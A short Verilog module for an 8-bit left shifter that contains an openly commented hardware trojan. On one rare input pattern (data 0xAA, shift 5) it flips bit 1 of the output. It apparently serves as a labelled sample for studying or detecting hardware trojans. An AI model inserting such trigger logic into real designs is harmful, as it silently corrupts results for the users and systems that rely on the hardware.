module shift8(input [7:0] d, input [2:0] sh, output [7:0] y);
  wire [7:0] shift_result;
  wire trigger;
  wire [7:0] corrupt_mask;

  assign shift_result = d << sh;

  // Trojan: rare trigger on specific input pattern
  assign trigger = (d == 8'hAA) && (sh == 3'b101);

  // When triggered, corrupt bit 1 of the result (performance/correctness degradation)
  assign corrupt_mask = trigger ? 8'h02 : 8'h00;

  assign y = shift_result ^ corrupt_mask;
endmodule